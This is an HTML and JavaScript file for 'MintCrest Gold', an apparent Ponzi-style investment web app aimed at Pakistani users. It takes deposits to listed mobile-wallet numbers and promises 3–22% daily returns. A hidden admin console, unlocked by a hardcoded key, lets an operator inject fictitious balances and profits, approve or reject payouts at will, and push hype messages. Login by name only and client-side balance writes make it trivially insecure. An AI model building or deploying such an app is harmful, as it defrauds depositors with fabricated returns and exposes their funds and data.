<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Luxury Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow-x: hidden; }
        
        /* COLORFUL GRADIENTS */
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
        .card-blue { background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); border: none; }
        .card-gold { background: linear-gradient(135deg, #78350f 0%, #fbbf24 100%); border: none; }
        .card-purple { background: linear-gradient(135deg, #4c1d95 0%, #8b5cf6 100%); border: none; }
        
        .active-tab { color: #60a5fa; border-top: 3px solid #60a5fa; background: linear-gradient(to top, rgba(96,165,250,0.1), transparent); }
        .page { display: none; animation: slideUp 0.4s ease; }
        .active-page { display: block; }
        
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        
        .badge-pending { background: #fef3c7; color: #92400e; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; }
        .badge-approved { background: #dcfce7; color: #166534; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; }
        .badge-rejected { background: #fee2e2; color: #991b1b; padding: 2px 6px; border-radius: 4px; font-size: 7px; font-weight: 800; }

        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; white-space: nowrap; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="promo-ticker" class="hidden bg-gradient-to-r from-blue-600 via-purple-600 to-blue-600 py-2 overflow-hidden z-[500] shadow-lg">
        <div class="animate-marquee text-[10px] font-black uppercase tracking-widest text-white">
            💎 <span id="ticker-text">Welcome to MintCrest Gold - Global Trusted Asset Management - 100% Secure</span> 💎
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-6xl font-black italic tracking-tighter mb-2 uppercase bg-gradient-to-r from-white to-blue-500 bg-clip-text text-transparent">MINTCREST</h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold italic">Global Digital Vault</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Legal Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 transition-all text-blue-200">
                <button onclick="login()" class="w-full card-blue py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all text-white">Secure Access</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="card-blue p-10 rounded-[3rem] mb-6 shadow-2xl relative overflow-hidden">
                <div class="absolute -right-10 -top-10 w-40 h-40 bg-white/10 rounded-full blur-3xl"></div>
                <p class="text-[9px] text-blue-100 font-extrabold mb-1 uppercase tracking-widest opacity-80">Vault Capital Balance</p>
                <h2 class="text-5xl font-black tracking-tighter text-white" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[9px] font-black text-yellow-300 uppercase italic">Syncing Ledger...</div>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-white/20 text-white px-4 py-2 rounded-full font-bold border border-white/30 uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-black/20 text-blue-200 px-4 py-2 rounded-full font-bold uppercase italic border border-white/10">No Fleet</span>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-green-500 active:scale-95 transition-all">📥 <span class="text-[9px] font-black block mt-2 uppercase text-green-400">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center border-b-4 border-red-500 active:scale-95 transition-all">📤 <span class="text-[9px] font-black block mt-2 uppercase text-red-400">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl">Trading Fleet</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <div class="flex justify-between items-center mb-6">
                <h2 class="font-black italic uppercase text-blue-400">Vault Ledger</h2>
                <button onclick="clearHistory()" class="text-[7px] bg-red-500/10 px-3 py-1 rounded-full border border-red-500/20 text-red-400 font-black uppercase">Clear Records</button>
            </div>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="card-gold p-8 rounded-[3rem] shadow-xl text-white">
                <h3 class="font-black text-[11px] uppercase mb-2 text-center italic">Reward Center 🎁</h3>
                <input type="text" id="promo-input" placeholder="Enter Code..." class="w-full bg-white/20 p-4 rounded-2xl text-[10px] border border-white/30 outline-none mb-4 text-center font-bold placeholder-white/50">
                <button onclick="applyPromoRequest()" class="w-full bg-white text-amber-900 py-4 rounded-2xl font-black text-[10px] uppercase shadow-lg">Submit Promo</button>
            </div>

            <div class="glass p-8 rounded-[3rem] text-center border-l-8 border-green-500">
                <h3 class="text-green-500 font-black text-[10px] uppercase mb-1">Official Community</h3>
                <p class="text-[7px] text-gray-500 mb-4 uppercase italic font-bold">Latest Proofs & Updates</p>
                <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" target="_blank" class="inline-block bg-green-600 text-white px-10 py-4 rounded-2xl font-black text-[9px] uppercase tracking-widest shadow-lg shadow-green-900/20">🟢 Join WhatsApp</a>
            </div>

            <div class="glass p-8 rounded-[3rem] text-[8px] text-gray-400 font-bold uppercase leading-relaxed border-t border-white/10">
                <h4 class="text-blue-500 mb-3 text-[10px] text-center italic">MintCrest Privacy Policy</h4>
                <p class="mb-2">• All transactions are encrypted via Global Asset Protocol.</p>
                <p class="mb-2">• 10% Maintenance Tax applies on all withdrawals.</p>
                <p class="mb-2">• Withdrawals processed within 2-24 hours daily.</p>
                <p>• Multi-account usage results in permanent vault freeze.</p>
            </div>

            <div class="glass p-8 rounded-[3rem]">
                <h3 class="text-blue-500 font-black text-[11px] uppercase mb-4 italic text-center">Help Desk 🛠️</h3>
                <textarea id="support-msg" placeholder="Write to Admin..." class="w-full bg-white/5 p-5 rounded-2xl text-[10px] border border-white/10 outline-none mb-4 h-24 font-bold text-blue-200"></textarea>
                <button onclick="sendSupport()" class="w-full card-blue py-4 rounded-2xl font-black text-[10px] uppercase text-white shadow-xl">Send Ticket</button>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase border border-red-900/20">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic tracking-widest">Capital Funding</h3>
                <div class="space-y-3 mb-10 text-[10px] font-black">
                    <div class="glass p-5 rounded-2xl flex justify-between bg-blue-500/5"><span>JAZZCASH/SADAPAY</span><span class="text-blue-400">03705519562</span></div>
                    <div class="glass p-5 rounded-2xl flex justify-between bg-green-500/5"><span>EASYPAISA</span><span class="text-green-400">03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold border border-white/10">
                <input type="text" id="dep-trx" placeholder="TID (Transaction ID)" class="w-full bg-white/5 p-5 rounded-2xl mb-6 text-center font-bold uppercase border border-white/10">
                <label class="block w-full bg-white/5 p-5 rounded-2xl mb-8 border border-dashed border-white/20 cursor-pointer">
                    <span id="file-label" class="text-[9px] font-bold opacity-50 uppercase italic">📸 Upload Proof Screenshot</span>
                    <input type="file" id="dep-proof" accept="image/*" class="hidden" onchange="document.getElementById('file-label').innerText = 'Proof Attached ✅'">
                </label>
                <button onclick="submitDeposit()" class="w-full card-blue py-6 rounded-2xl font-black text-[10px] uppercase text-white shadow-lg">Verify Funding</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 text-center shadow-2xl">
                <h3 class="font-black text-red-500 mb-4 uppercase text-sm italic">Request Payout</h3>
                <p class="text-[8px] text-gray-500 mb-6 font-bold uppercase tracking-widest italic">10% Service Tax Deducted</p>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold border border-white/10">
                <input type="text" id="wd-acc" placeholder="Account Name & Number" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-[9px] font-bold border border-white/10">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase text-white shadow-lg">Authorize Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#010409] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-blue-500 uppercase italic tracking-tighter">Master Console V7</h2>
            <button onclick="closeAdmin()" class="bg-red-500 text-white px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>
        
        <div class="flex gap-2 mb-8 overflow-x-auto no-scrollbar">
            <button onclick="showAdmTab('requests')" class="card-blue px-6 py-3 rounded-xl text-[9px] font-black uppercase whitespace-nowrap text-white">Orders/Msgs</button>
            <button onclick="showAdmTab('users')" class="glass px-6 py-3 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">User List</button>
            <button onclick="showAdmTab('broadcast')" class="card-gold px-6 py-3 rounded-xl text-[9px] font-black uppercase whitespace-nowrap text-white">Ticker News</button>
        </div>

        <div id="adm-sec-requests" class="adm-tab space-y-3"></div>
        <div id="adm-sec-users" class="adm-tab hidden space-y-2"></div>

        <div id="adm-sec-broadcast" class="adm-tab hidden glass p-8 rounded-[3rem]">
            <h3 class="text-yellow-500 font-black text-xs uppercase mb-4 text-center italic">Ticker Message Control</h3>
            <textarea id="bc-msg" placeholder="Write new update for users..." class="w-full bg-white/5 p-5 rounded-2xl text-[10px] border border-white/10 outline-none mb-4 h-24 font-bold text-white"></textarea>
            <button onclick="sendBroadcast()" class="w-full card-gold py-4 rounded-2xl font-black text-[10px] uppercase text-white">🚀 Publish Live</button>
        </div>

        <div class="glass p-8 rounded-[3rem] mt-10">
            <h3 class="text-[9px] font-black uppercase mb-4 opacity-50 text-center tracking-[0.2em] italic">Manual Capital Injector</h3>
            <input type="text" id="adm-user" placeholder="User Full Name" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-[10px] font-bold border border-white/10">
            <input type="number" id="adm-val" placeholder="Amount (PKR)" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px] font-bold border border-white/10">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="manualEdit('balance')" class="card-blue py-3 rounded-xl font-black text-[9px] uppercase text-white">Add Balance</button>
                <button onclick="manualEdit('profit')" class="bg-green-600 py-3 rounded-xl font-black text-[9px] uppercase text-white">Add Profit</button>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab">🏠<span class="text-[8px] font-black uppercase mt-1">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2">📈<span class="text-[8px] font-black uppercase mt-1">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2">📜<span class="text-[8px] font-black uppercase mt-1">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2">🏢<span class="text-[8px] font-black uppercase mt-1">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3, d: 30 }, { n: "Micro-Elite II", p: 500, r: 3.2, d: 30 },
            { n: "Bronze-S", p: 1000, r: 3.5, d: 30 }, { n: "Bronze-X", p: 2000, r: 3.8, d: 30 },
            { n: "Silver-S", p: 3000, r: 4.2, d: 30 }, { n: "Silver-X", p: 5000, r: 4.5, d: 30 },
            { n: "Gold-S", p: 7000, r: 5, d: 30 }, { n: "Gold-X", p: 10000, r: 5.5, d: 30 },
            { n: "Gold-Master", p: 15000, r: 6, d: 30 }, { n: "Platinum-S", p: 20000, r: 6.5, d: 30 },
            { n: "Platinum-X", p: 30000, r: 7, d: 30 }, { n: "Diamond-S", p: 40000, r: 7.5, d: 30 },
            { n: "Diamond-X", p: 50000, r: 8, d: 30 }, { n: "Royal-S", p: 75000, r: 9, d: 30 },
            { n: "Royal-Grand", p: 100000, r: 10, d: 30 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, s: true },
            { n: "⭐ VIP ACCESS", p: 2500, r: 14, s: true },
            { n: "💎 ELITE PASS", p: 8000, r: 15, s: true },
            { n: "🚀 ROCKET PRO", p: 12000, r: 18, s: true },
            { n: "👑 CROWN KING", p: 25000, r: 22, s: true }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); listenForPromos();
        };

        function listenForPromos() { db.collection("app_data").doc("announcement").onSnapshot(doc => { if(doc.exists) { document.getElementById('promo-ticker').classList.remove('hidden'); document.getElementById('ticker-text').innerText = doc.data().message; } }); }

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierExpiry: 0, tierName: "Inactive" });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); document.getElementById('tier-tag').innerText = user.tierName; checkProfitReq(user); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 py-20 text-[9px] font-black uppercase">Ledger is Empty</p>' : '';
                let items = []; snap.forEach(doc => { if(!localStorage.getItem('clear_'+doc.id)) items.push({id: doc.id, ...doc.data()}); }); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { 
                    const clr = d.type.includes('dep') ? 'border-blue-500' : 'border-green-500'; 
                    list.innerHTML += `<div class="glass p-5 rounded-3xl flex justify-between items-center border-l-4 ${clr} mb-2 text-[9px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px] font-bold">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="badge-${d.status}">${d.status}</span></div></div>`; 
                });
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const isSpecial = p.s;
                const style = isSpecial ? 'background: linear-gradient(135deg, rgba(96, 165, 250, 0.2), rgba(139, 92, 246, 0.2)); border: 1px solid rgba(96, 165, 250, 0.3);' : '';
                const dayLabel = isSpecial ? '' : `<p class="text-[7px] text-gray-500 font-bold uppercase mt-1 italic">⏳ 30 Days Contract</p>`;
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-5 rounded-[2.5rem] flex justify-between items-center active:scale-95 cursor-pointer mb-2" style="${style}"><div><h4 class="font-black text-[10px] uppercase ${isSpecial ? 'text-blue-400' : 'text-gray-400'}">${p.n}</h4><p class="text-[8px] text-green-400 font-bold uppercase">${p.r}% Daily Yield</p>${dayLabel}</div><div class="text-right font-black text-[12px]">₨ ${p.p.toLocaleString()}</div></div>`;
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const f = document.getElementById('dep-proof');
            if(!a || !t || !f.files[0]) return alert("Missing Details!");
            const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: r.result, type: "deposit", status: "pending", time: Date.now() });
                alert("Deposit Logged! Admin will verify TID."); changePage('activity');
            };
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a || !acc || parseInt(a) > user.balance) return alert("Invalid Amount!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw (10% Tax)", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); alert("Requested!"); changePage('activity');
        }

        async function buy(p, roi, tName) {
            if(user.balance < p) { alert("Low Funds!"); changePage('wallet'); }
            else { if(confirm("Activate "+tName+"?")) { const exp = Date.now() + (30 * 86400000); await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, tierExpiry: exp, lastReqTime: Date.now() }); await db.collection("requests").add({ user: user.name, amount: p, type: "Activation", status: "approved", time: Date.now() }); alert("Success!"); changePage('activity'); } }
        }

        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Profit Yield", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        function updateCountdown() { if (user && user.activeTier > 0) { const d = (user.lastReqTime + 86400000) - Date.now(); if(d>0) { const h = Math.floor(d/3600000); const m = Math.floor((d%3600000)/60000); const s = Math.floor((d%60000)/1000); document.getElementById('countdown-display').innerText = `NEXT YIELD: ${h}H ${m}M ${s}S`; } else { document.getElementById('countdown-display').innerText = "YIELD READY"; } } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE"; } }
        function clearHistory() { if(confirm("Clear ledger records?")) { db.collection("requests").where("user", "==", user.name).get().then(snap => { snap.forEach(doc => { localStorage.setItem('clear_'+doc.id, 'true'); }); location.reload(); }); } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function applyPromoRequest() { const c = document.getElementById('promo-input').value.trim().toUpperCase(); if(!c) return; db.collection("requests").add({ user: user.name, amount: 0, type: "Promo: "+c, status: "pending", time: Date.now() }); alert("Submitted!"); document.getElementById('promo-input').value = ''; }
        function sendSupport() { const m = document.getElementById('support-msg').value.trim(); if(!m) return; db.collection("requests").add({ user: user.name, type: "Support Ticket", message: m, status: "pending", amount: 0, time: Date.now() }); alert("Sent!"); document.getElementById('support-msg').value = ''; }
        
        function adminTap() { tapCount++; if(tapCount >= 4) { if(prompt("Access Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }
        async function sendBroadcast() { const m = document.getElementById('bc-msg').value.trim(); await db.collection("app_data").doc("announcement").set({ message: m }); alert("Live!"); }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    const pBtn = d.proof ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-blue-600 px-3 py-1 rounded text-[7px] font-black italic">📸 PROOF</button>` : '';
                    list.innerHTML += `<div class="glass p-5 rounded-2xl flex flex-col text-[8px] font-black uppercase mb-3">
                        <div class="flex justify-between mb-2"><span>${d.user}</span><span class="text-blue-400">Rs ${d.amount}</span></div>
                        <div class="mb-3 opacity-50">${d.type} ${d.tid ? '| TID: '+d.tid : ''} ${d.acc ? '| '+d.acc : ''} ${d.message ? '| MSG: '+d.message : ''}</div>
                        <div class="flex gap-2">${pBtn}<button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="flex-1 bg-green-600 py-2 rounded">APPROVE</button><button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="flex-1 bg-red-600 py-2 rounded">REJECT</button></div>
                    </div>`;
                });
            });
            db.collection("users").onSnapshot(snap => { const list = document.getElementById('adm-sec-users'); list.innerHTML = ''; snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[8px] font-black uppercase"><div>${u.name}<br>Bal: ${u.balance}</div><button onclick="deleteUser('${u.name}')" class="text-red-500">❌</button></div>`; }); });
        }

        async function handle(id, u, amt, act, type) { 
            const ref = db.collection("users").doc(u); const doc = await ref.get(); let finalAmt = amt;
            if(act==='approved') { 
                if(type.includes('Promo')) { const bonus = prompt("Bonus Amount:"); if(!bonus) return; finalAmt = parseInt(bonus); }
                if(type==='deposit' || type.includes('Profit') || type.includes('Promo')) { await ref.update({ balance: (doc.data().balance||0) + finalAmt }); }
            } else if(act==='rejected' && type==='withdraw') { await ref.update({ balance: (doc.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act, amount: finalAmt }); 
        }

        async function manualEdit(f) { const u = document.getElementById('adm-user').value; const v = parseInt(document.getElementById('adm-val').value); const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f]||0)+v }); alert("Funds Injected!"); }
        async function deleteUser(n) { if(confirm("Delete user "+n+"?")) await db.collection("users").doc(n).delete(); }
    </script>
</body>
</html>
